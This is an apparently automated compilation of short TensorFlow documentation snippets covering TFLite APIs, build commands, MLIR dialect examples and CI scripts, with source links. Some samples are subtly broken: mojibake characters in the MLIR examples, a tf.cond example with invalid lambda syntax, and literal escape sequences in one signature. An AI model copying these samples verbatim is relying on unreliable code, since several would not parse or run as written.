LANGUAGE: Shell
CODE:
```
bazel build -c opt --dynamic_mode=off --config=android_arm64 --copt=-DGOOGLE_COMMANDLINEFLAGS_FULL_API=1 ops:op_name_test
```

----------------------------------------

TITLE: Installing Orbax Export Library
DESCRIPTION: Installs or upgrades the Orbax Export library using pip, which is utilized in this process for exporting the JAX model into a format compatible with TensorFlow SavedModel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_3

LANGUAGE: Python
CODE:
```
!pip install orbax-export --upgrade
```

----------------------------------------

TITLE: TfLiteCoreMlDelegateCreate C++ Function Definition (C++)
DESCRIPTION: Defines the C API function used to create an instance of the Core ML delegate. It takes a pointer to the options struct and returns a TfLiteDelegate pointer, which must outlive the interpreter it's attached to.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/coreml/README.md#_snippet_6

LANGUAGE: C++
CODE:
```
// Return a delegate that uses CoreML for ops execution.
// Must outlive the interpreter.
TfLiteDelegate* TfLiteCoreMlDelegateCreate(
   const TfLiteCoreMlDelegateOptions* options);
```

----------------------------------------

TITLE: Declaring Package Upload Dependencies (CI)
DESCRIPTION: Specifies dependencies required for packaging and uploading built artifacts, such as Python wheels, to repositories. Includes tools like auditwheel for checking wheel conformity and twine for package uploading.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/devel.requirements.txt#_snippet_3

LANGUAGE: pip requirements
CODE:
```
# For uploading
auditwheel ~= 5.0.0
twine ~= 3.6.0
```

----------------------------------------

TITLE: Creating TFLite Support TextSearcher from Options (Python)
DESCRIPTION: A class method to create a `TextSearcher` instance using a `TextSearcherOptions` object. This allows more detailed configuration compared to creating directly from files. Returns a configured `TextSearcher` object or raises `ValueError` or `RuntimeError` for invalid options or runtime issues.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextSearcher.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_options(
    options: tflite_support.task.text.TextSearcherOptions
) -> 'TextSearcher'
```

----------------------------------------

TITLE: Creating Metadata from Info Objects (Python)
DESCRIPTION: Creates a MetadataWriter object based on simplified general, input, and output information objects. If not specified, default metadata is generated for each category.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/nl_classifier/MetadataWriter.md#_snippet_3

LANGUAGE: Python
CODE:
```
@classmethod
create_from_metadata_info(
    model_buffer: bytearray,
    general_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/GeneralMd"><code>tflite_support.metadata_writers.metadata_info.GeneralMd</code></a>] = None,
    input_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/InputTextTensorMd"><code>tflite_support.metadata_writers.metadata_info.InputTextTensorMd</code></a>] = None,
    output_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/ClassificationTensorMd"><code>tflite_support.metadata_writers.metadata_info.ClassificationTensorMd</code></a>] = None
)
```

----------------------------------------

TITLE: Download File Google Colab Python
DESCRIPTION: Provides a mechanism to download the generated TFLite model file directly from the notebook environment, specifically designed for use within Google Colab. It checks for the presence of the Colab files module and initiates the download if available.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_21

LANGUAGE: python
CODE:
```
try:
  from google.colab import files
except ImportError:
  pass
else:
  files.download(tflite_file)
```

----------------------------------------

TITLE: Adding Options to a Process Unit in Python
DESCRIPTION: This function is used to add specific options data to a ProcessUnit FlatBuffer object being constructed by a FlatBuffer builder. It typically follows the creation of the options data itself and precedes the final creation of the ProcessUnit.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnitAddOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ProcessUnitAddOptions(
    builder, options
)
```

----------------------------------------

TITLE: Defining Function with TensorFlow Dialect in MLIR
DESCRIPTION: This MLIR code defines a function `some_function` using the `tf` dialect. It demonstrates basic operations like `tf.Add` and `tf.Mul`, constant definition via `arith.constant`, and the structured `tf.If` operation for conditional control flow. Operations within this dialect have sequential execution semantics in a basic block, without control dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/g3doc/tf_dialects.md#_snippet_0

LANGUAGE: MLIR
CODE:
```
/// This is a regular function, taking inputs by value and returning a new value.
/// The body is a regular CFG.
func some_function(%input : tensor<*xf32>) -> tensor<*xf32> {
  // TensorFlow operations are not variadic: this `tf.add` operation always
  // takes two inputs and returns a single output. This simplifies
  // pattern-matching, verification and rewriting.
  %added = tf.Add %input, %input : tensor<*xf32>
  // Operations have sequential execution semantics in a basic block, there are
  // no control dependencies.  The compiler can reorder operations according to
  // the as-if rule ( https://en.wikipedia.org/wiki/As-if_rule ).
  %three = arith.constant splat<tensor<f32>, 3.0>
  %mul = tf.Mul %input, %three : (tensor<*xf32>, tensor<f32>) -> tensor<*xf32>

  // Only control flow v2 is supported in TF dialect.
  // The tf.If operation takes three functions that accept the same
  // arguments: the condition returns a bool and the two branches must return
  // the same type, which is also the return of the tf.If.
  %value = "tf.Ifâ(%added, %mul)
             {cond: @cond_func, true_branch: @func_foo, false_branch: @func_bar}
                 : (tensor<*xf32>, tensor<*xf32>) -> tensor<*xf32>

  return %value : tensor<*xf32>
}
```

----------------------------------------

TITLE: Running Specific TFLite Micro Test with Make | bash
DESCRIPTION: Executes a single, named unit test within the TensorFlow Lite for Microcontrollers library. Replace `<test_name>` with the specific test target defined in the project's Makefiles.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/library.md#_snippet_2

LANGUAGE: bash
CODE:
```
make -f tensorflow/lite/micro/tools/make/Makefile test_<test_name>
```

----------------------------------------

TITLE: Splitting DataLoader Dataset (split) - Python
DESCRIPTION: Splits the dataset contained within the DataLoader instance into two sub-datasets based on a specified fraction. This method is primarily used for separating data into training and testing sets.

Args:
  fraction: float, demonstrates the fraction of the first returned subdataset in the original data.

Returns:
  The splitted two sub datasets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/DataLoader.md#_snippet_4

LANGUAGE: python
CODE:
```
split(
    fraction
)
```

----------------------------------------

TITLE: Executing a Specific CI Script Example
DESCRIPTION: This snippet provides a single-line example demonstrating how to change into the TensorFlow directory and execute a specific CI script (`wheel.sh`) with an environment configured directly via the `TFCI` variable. The configuration `py312,linux_x86_cuda,public_cache,disk_cache` specifies Python 3.12, Linux x86_64 with CUDA, using both the public and local disk caches.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/README.md#_snippet_0

LANGUAGE: bash
CODE:
```
cd tensorflow-git-dir

# Here is a single-line example of running a script on Linux to build the
# GPU version of TensorFlow for Python 3.12, using the public TF bazel cache and
# a local build cache:
TFCI=py312,linux_x86_cuda,public_cache,disk_cache ci/official/wheel.sh
```

----------------------------------------

TITLE: Importing TensorFlowLite Swift Module (Swift)
DESCRIPTION: Imports the TensorFlowLite module into a Swift source file. This step is necessary to access any of the classes, structs, and functions provided by the TensorFlow Lite Swift library in your application code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/swift/README.md#_snippet_2

LANGUAGE: swift
CODE:
```
import TensorFlowLite
```

----------------------------------------

TITLE: Configuring CMake to Link TFLITE_FLEX
DESCRIPTION: Reruns the CMake configuration step, adding the `-DLINK_TFLITE_FLEX="ON"` flag. This enables linking the minimal example with the TensorFlow Lite Flex delegate, allowing usage of TF select operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/README.md#_snippet_6

LANGUAGE: sh
CODE:
```
cmake ../tensorflow_src/tensorflow/lite/examples/minimal -DLINK_TFLITE_FLEX="ON"
```

----------------------------------------

TITLE: Get ImageSize Height Python
DESCRIPTION: This instance method retrieves the height dimension value stored within the ImageSize object. It should be called on an already initialized instance of the ImageSize class. The method returns an integer representing the image height.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSize.md#_snippet_2

LANGUAGE: python
CODE:
```
Height()
```

----------------------------------------

TITLE: Pulling TensorFlow Build Docker Image - Bash
DESCRIPTION: This command downloads a specific TensorFlow build Docker image from Docker Hub. It pulls the 'latest-python3.9' tag from the 'tensorflow/build' repository. Pulling the image is a prerequisite before starting a container based on that image to perform builds or run tests.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
docker pull tensorflow/build:latest-python3.9
```

----------------------------------------

TITLE: Initializing ScoreBruteForce Class in Python
DESCRIPTION: Provides the constructor signature for the `tflite_model_maker.searcher.ScoreBruteForce` class. This class configures a brute force scoring method for embeddings within a partition, specifically designed *without* applying compression or quantization. It takes no parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/ScoreBruteForce.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.searcher.ScoreBruteForce()
```

----------------------------------------

TITLE: Defining TFLite Flex Shared Object Target - Bazel
DESCRIPTION: This Bazel build rule defines the target for building the TensorFlow Lite Flex delegate shared library. This library is necessary for models utilizing Select TF operations and includes the standard set of TensorFlow ops and kernels.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_10

LANGUAGE: Bazel
CODE:
```
load(
    "@org_tensorflow//tensorflow/lite/delegates/flex:build_def.bzl",
    "tflite_flex_shared_library"
)

# Shared lib target for convenience, pulls in the standard set of TensorFlow
# ops and kernels. The output library name is platform dependent:
#   - Linux/Android: `libtensorflowlite_flex.so`
#   - Mac: `libtensorflowlite_flex.dylib`
#   - Windows: `libtensorflowlite_flex.dll`
tflite_flex_shared_library(
  name = "tensorflowlite_flex",
  models = [
      ":model_one.tflite",
      ":model_two.tflite",
  ],
)
```

----------------------------------------

TITLE: Defining TensorFlow Executor Graph in MLIR
DESCRIPTION: This MLIR code demonstrates the `tf_executor.graph` operation, which models the TensorFlow executor semantics, including potential concurrency, deadness propagation, and control dependencies. Operations within the graph block like `tf_executor.opA`, `opB`, etc., can execute when inputs are ready and return a control token. The `tf_executor.fetch` operation specifies the graph's output values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/g3doc/tf_dialects.md#_snippet_1

LANGUAGE: MLIR
CODE:
```
%fetches = tf_executor.graph : tensor<*xf32> {
  // Operations in the current block execute when their inputs are ready,
  // possibly concurrently.
  // Only operations in the tf_executor dialect are expected here.
  // Ops can return multiple outputs and a control token for control
  // dependencies.
  // We donât mention the control token in the return type here, it is implicit.
  %0, %ctl0 = tf_executor.opA %feed#0, %feed#1 : tensor<*xf32>
  %1, %ctl1 = tf_executor.opB : tensor<*xf32>
  %2, %ctl2 = tf_executor.opC %1, %ctl0 : tensor<*xf32>
  %3, %ctl3 = tf_executor.opD %2 : tensor<*xf32>
  tf_executor.fetch %3 : tensor<*xf32>
} // end of the âtf_executor.graph" operation/region
```

----------------------------------------

TITLE: Packing TFLite Subgraph Metadata into Buffer (Python)
DESCRIPTION: Packs the current `SubGraphMetadataT` object into a FlatBuffers builder. This method serializes the object's data into a binary format suitable for storage or transmission, typically as part of constructing a complete TFLite metadata buffer. Requires a FlatBuffers builder instance to write the data into.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataT.md#_snippet_4

LANGUAGE: Python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Setting label_image Target Properties and Installation (CMake)
DESCRIPTION: Controls whether the `label_image` target is included in the default build (`EXCLUDE_FROM_ALL`) based on the `TFLITE_ENABLE_LABEL_IMAGE` option and sets up installation rules if `TFLITE_ENABLE_INSTALL` is also enabled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/CMakeLists.txt#_snippet_7

LANGUAGE: cmake
CODE:
```
if(TFLITE_ENABLE_LABEL_IMAGE)
  set_target_properties(label_image PROPERTIES EXCLUDE_FROM_ALL FALSE)
  if(TFLITE_ENABLE_INSTALL)
    install(TARGETS label_image)
  endif()  # TFLITE_ENABLE_INSTALL
else()
  set_target_properties(label_image PROPERTIES EXCLUDE_FROM_ALL TRUE)
endif()  # TFLITE_ENABLE_LABEL_IMAGE
```

----------------------------------------

TITLE: Getting Populated Metadata JSON (Python)
DESCRIPTION: Retrieves the metadata as a JSON string after it has been populated into the TFLite model buffer. This string includes additional fields added during the population process, such as the minimum parser version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/nl_classifier/MetadataWriter.md#_snippet_5

LANGUAGE: Python
CODE:
```
get_populated_metadata_json() -> str
```

----------------------------------------

TITLE: Lowering tf.SpaceToDepth to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.SpaceToDepth` operation, which rearranges data from spatial blocks into depth, to the TOSA dialect's `lower_space_to_depth_op`. It uses `block_size` and `data_format` attributes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_35

LANGUAGE: MLIR
CODE:
```
%output = tf.SpaceToDepth(%input) {block_size, data_format}
```

LANGUAGE: MLIR
CODE:
```
%output = lower_space_to_depth_op(%input, block_size, data_format)
```

----------------------------------------

TITLE: Creating Interpreter API Options with GPU Delegate Factory (Kotlin)
DESCRIPTION: Create options for the TFLite Interpreter API, setting the runtime and explicitly adding the `GpuDelegateFactory` to enable GPU inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_27

LANGUAGE: Kotlin
CODE:
```
val interpreterOption = InterpreterApi.Options()
         .setRuntime(TfLiteRuntime.FROM_SYSTEM_ONLY)
         .addDelegateFactory(GpuDelegateFactory())
```

----------------------------------------

TITLE: Compiling Java Code with TensorFlow JAR (Shell)
DESCRIPTION: Compiles Java source files that use the TensorFlow Java API. This command adds the built `libtensorflow.jar` file to the Java compiler's classpath, making the TensorFlow classes available during compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/java/LEGACY.md#_snippet_2

LANGUAGE: Shell
CODE:
```
javac -cp bazel-bin/tensorflow/java/libtensorflow.jar ...
```

----------------------------------------

TITLE: Configuring XLA for CPU Backend Natively (Linux)
DESCRIPTION: Executes the XLA configuration script `./configure.py` directly from the repository root on the host system, setting the build target backend to CPU. This prepares the native build environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/build_from_source.md#_snippet_4

LANGUAGE: shell
CODE:
```
./configure.py --backend=CPU
```

----------------------------------------

TITLE: Evaluating Model Detailed Process Python
DESCRIPTION: Evaluates the performance of the trained model using the test dataset. It computes and returns the loss and accuracy, providing metrics for how well the model generalizes to unseen data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_12

LANGUAGE: python
CODE:
```
loss, accuracy = model.evaluate(test_data)
```

----------------------------------------

TITLE: Run Standard hlo-opt for Pass Development (Bazel)
DESCRIPTION: This command executes the standard `hlo-opt` tool using Bazel, suitable for testing both hardware-independent and hardware-specific (CPU, GPU) HLO passes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_13

LANGUAGE: Bazel
CODE:
```
bazel run //xla/tools:hlo-opt -- [flags] <filename>
```

----------------------------------------

TITLE: Initializing Embedding Object - TFLite Support Python
DESCRIPTION: Defines the constructor signature for the `Embedding` class in TFLite Support. It takes a `feature_vector` of type `FeatureVector` and an integer `output_index` to create an instance representing an embedding result.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Embedding.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.Embedding(
    feature_vector: tflite_support.task.processor.FeatureVector,
    output_index: int
)
```

----------------------------------------

TITLE: Build Docker Image for TF Lite Android Build
DESCRIPTION: Build a Docker image using the provided tflite-android.Dockerfile. This image encapsulates the necessary tools and dependencies (like SDK, NDK, Bazel) for building TensorFlow Lite for Android, creating a consistent build environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/lite_build.md#_snippet_2

LANGUAGE: shell
CODE:
```
docker build . -t tflite-builder -f tflite-android.Dockerfile
```

----------------------------------------

TITLE: Checking Equality of ConfidenceMask objects - Python
DESCRIPTION: This snippet presents the signature for the `__eq__` method. It is used to compare the current `ConfidenceMask` object with another object to check if they are equal, returning a boolean.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/ConfidenceMask.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Creating BertCluAnnotator from File (Python)
DESCRIPTION: Documents the `create_from_file` class method. This factory method provides a convenient way to instantiate the `BertCluAnnotator` directly from a TensorFlow Lite model file path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertCluAnnotator.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod\ncreate_from_file(\n    file_path: str\n) -> 'BertCluAnnotator'
```

----------------------------------------

TITLE: No-Operation Node - TensorFlow GraphDef
DESCRIPTION: This is a simple node that performs no computation ('NoOp'). It is often used in TensorFlow graphs to enforce control dependencies between operations, ensuring a specific execution order without adding functional logic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tf2xla/api/v2/testdata/graph_with_flib_def.txt#_snippet_2

LANGUAGE: TensorFlow GraphDef
CODE:
```
node {
  name: "NoOp"
  op: "NoOp"
}
```

----------------------------------------

TITLE: Converting SavedModel using TFLite Convert CLI
DESCRIPTION: Shows the command-line method using tflite_convert to convert a TensorFlow SavedModel located in a specified directory to a TensorFlow Lite model file. It requires providing the input directory and the desired output file path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/convert_models.md#_snippet_4

LANGUAGE: sh
CODE:
```
tflite_convert \
  --saved_model_dir=/tmp/mobilenet_saved_model \
  --output_file=/tmp/mobilenet.tflite
```

----------------------------------------

TITLE: Instantiating Keras ResNet50 Model Python
DESCRIPTION: This code instantiates a ResNet50 model from the `keras.applications` module. It includes the top classification layer (`include_top=True`) and loads pre-trained weights from the 'imagenet' dataset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/keras/keras_jax_backend_to_tfl.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
jax_model = keras.applications.resnet.ResNet50(include_top=True, weights="imagenet")
```

----------------------------------------

TITLE: Determining Library Type (Static/Shared) - CMake
DESCRIPTION: Initializes the `TFLITE_C_LIBTYPE` variable to STATIC. If the `TFLITE_C_BUILD_SHARED_LIBS` option is enabled, it changes the `TFLITE_C_LIBTYPE` to SHARED, controlling how the C API library will be built.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/CMakeLists.txt#_snippet_7

LANGUAGE: CMake
CODE:
```
set(TFLITE_C_LIBTYPE STATIC)
if (TFLITE_C_BUILD_SHARED_LIBS)
  set(TFLITE_C_LIBTYPE SHARED)
endif()
```

----------------------------------------

TITLE: Add TFLite Swift Nightly Pod with Delegates (Ruby)
DESCRIPTION: Defines the dependency on the TensorFlowLiteSwift nightly pod and explicitly includes the CoreML and Metal subspecs for GPU and Core ML delegates in the Podfile.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_4

LANGUAGE: Ruby
CODE:
```
pod 'TensorFlowLiteSwift', '~> 0.0.1-nightly', :subspecs => ['CoreML', 'Metal']
```

----------------------------------------

TITLE: Configure TFLite Build with Kernel Tests (CMake)
DESCRIPTION: Configures the TensorFlow Lite build using CMake to include the kernel unit tests. The flag `-DTFLITE_KERNEL_TEST=on` enables the build process to generate and compile the test executables for verifying kernel functionality.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_5

LANGUAGE: sh
CODE:
```
cmake ../tensorflow_src/tensorflow/lite -DTFLITE_KERNEL_TEST=on
```

----------------------------------------

TITLE: Initializing AudioPropertiesT From Buffer - Python
DESCRIPTION: This class method initializes an `AudioPropertiesT` object from a given buffer (`buf`) starting at a specific position (`pos`). It's typically used to deserialize data from a buffer format like FlatBuffers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioPropertiesT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)

```

----------------------------------------

TITLE: Initializing ModelMetadataT from Buffer (Python)
DESCRIPTION: A class method to initialize a `ModelMetadataT` object from a buffer (`buf`) starting at a specific position (`pos`). This is likely used for deserialization from a byte buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)

```

----------------------------------------

TITLE: Accessing Minimum Parser Version in ModelMetadata
DESCRIPTION: Retrieves the minimum parser version required to interpret this model metadata. This ensures compatibility with the metadata schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_9

LANGUAGE: python
CODE:
```
MinParserVersion()
```

----------------------------------------

TITLE: Executing Stable Delegate Test Suite on Android (Bash)
DESCRIPTION: Runs the stable delegate test suite executable on the Android device via adb shell, providing paths to the delegate settings and acceleration test configuration files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_4

LANGUAGE: bash
CODE:
```
adb shell "/data/local/tmp/stable_delegate_test_suite \
  --stable_delegate_settings_file=/data/local/tmp/stable_delegate_settings.json \
  --acceleration_test_config_path=/data/local/tmp/stable_delegate_acceleration_test_config.json"
```

----------------------------------------

TITLE: Creating Score Calibration Metadata Python
DESCRIPTION: This snippet shows the signature for the `create_metadata` method of the `ScoreCalibrationMd` class. This method generates the score calibration metadata object based on the information provided during the class initialization. It returns a Flatbuffers Python object representing the `ProcessUnitT`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/ScoreCalibrationMd.md#_snippet_1

LANGUAGE: python
CODE:
```
create_metadata() -> tflite_support.metadata_schema_py_generated.ProcessUnitT
```

----------------------------------------

TITLE: Add CoreML Delegate Subspec in Podfile
DESCRIPTION: Adds the CoreML delegate as a subspec to the TensorFlow Lite Swift or Objective-C CocoaPod in a Podfile, enabling Core ML integration for iOS projects. This is the standard way to include the delegate dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/coreml_delegate.md#_snippet_0

LANGUAGE: Podfile
CODE:
```
target 'YourProjectName'
  pod 'TensorFlowLiteSwift/CoreML', '~> 2.4.0'  # Or TensorFlowLiteObjC/CoreML
```

LANGUAGE: Podfile
CODE:
```
# Particularily useful when you also want to include 'Metal' subspec.
target 'YourProjectName'
  pod 'TensorFlowLiteSwift', '~> 2.4.0', :subspecs => ['CoreML']
```

----------------------------------------

TITLE: Calculating Output Width - C++
DESCRIPTION: This C++ snippet shows the calculation of the output width per element within the `decode_padded_raw_op.cc` implementation. It divides the `fixed_length` argument by the size of the template datatype `T`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-102.md#_snippet_1

LANGUAGE: c++
CODE:
```
int width = fixed_length / sizeof(T);
```

----------------------------------------

TITLE: Listing DTensor Layout APIs (C++)
DESCRIPTION: This snippet lists C++ symbols related to DTensor layout and mesh concepts, exposed by the `//tensorflow/dtensor/cc:tensor_layout` build target. It includes references to the `Mesh` and `Layout` classes/enums.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_11

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::Mesh
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::Layout
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::Layout::LayoutType
```

----------------------------------------

TITLE: Using tf.cond with Python Constant Condition - TensorFlow Python
DESCRIPTION: Demonstrates using `tf.cond` where the condition is a Python constant (`x > 0`). This condition is invariant during graph execution, similar to compile-time constants, allowing optimization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_0

LANGUAGE: Python
CODE:
```
x = 1
y = tf.cond(x > 0, lambda: 3 * x, lambda 5 * x)
```

----------------------------------------

TITLE: Create Bazel Output Directory (X86) - Shell
DESCRIPTION: Creates the directory specified by `--test_tmpdir` for Bazel to store build and test output files on the X86 configuration. It uses a different path compared to the ARM64 configuration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_23

LANGUAGE: Shell
CODE:
```
mkdir -p /Volumes/BuildData/bazel_output
```

----------------------------------------

TITLE: Adding Include Directories
DESCRIPTION: These commands add the build and source directories of the current CMake project to the include path, ensuring that generated `.inc` files and source files can be found during compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/IR/CMakeLists.txt#_snippet_2

LANGUAGE: cmake
CODE:
```
include_directories(BEFORE
    ${CMAKE_CURRENT_BINARY_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR})
```

----------------------------------------

TITLE: Comparing QuestionAnswererResult Equality Python
DESCRIPTION: Implements the equality comparison for the `QuestionAnswererResult` class. This method is used to check if the current object is equal to another provided object. Equality is typically determined by comparing the content of the `answers` list.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/QuestionAnswererResult.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Training BERT QA Model in TensorFlow
DESCRIPTION: Executes the training process for a BERT-based Question Answering model using a provided TensorFlow Dataset. Training runs for a specified number of epochs and steps, returning the trained Keras model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_14

LANGUAGE: python
CODE:
```
train(
    train_ds, epochs, steps_per_epoch, **kwargs
)

```

----------------------------------------

TITLE: Comparing ImageEmbedderOptions Equality Python
DESCRIPTION: This snippet shows the signature for the `__eq__` method of the `ImageEmbedderOptions` class. This method is used to check for equality between the current `ImageEmbedderOptions` instance and another object (`other`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageEmbedderOptions.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Get ImageSize Width Python
DESCRIPTION: This instance method retrieves the width dimension value stored within the ImageSize object. It must be called on an already initialized instance of the ImageSize class. The method returns an integer representing the image width.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSize.md#_snippet_5

LANGUAGE: python
CODE:
```
Width()
```

----------------------------------------

TITLE: Checking glibc Version (sh)
DESCRIPTION: Use the `ldd --version` command on the target device to determine the version of the GNU C Library (glibc). This information is crucial for selecting a compatible cross-compilation toolchain.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_arm.md#_snippet_0

LANGUAGE: sh
CODE:
```
ldd --version
```

----------------------------------------

TITLE: Checking Buffer Identifier for ValueRange in Python
DESCRIPTION: This class method checks if the provided buffer contains the identifier for a `ValueRange` FlatBuffer object. It takes the buffer (`buf`), an `offset`, and an optional `size_prefixed` flag.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRange.md#_snippet_5

LANGUAGE: Python
CODE:
```
@classmethod
ValueRangeBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Initializing ProcessUnitT From Packed Buffer Python
DESCRIPTION: This class method initializes a `ProcessUnitT` object from a packed byte buffer. It takes the buffer (`buf`) and an optional starting position (`pos`) to begin reading the packed data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnitT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Convert Keras Model to TensorFlow Lite Format
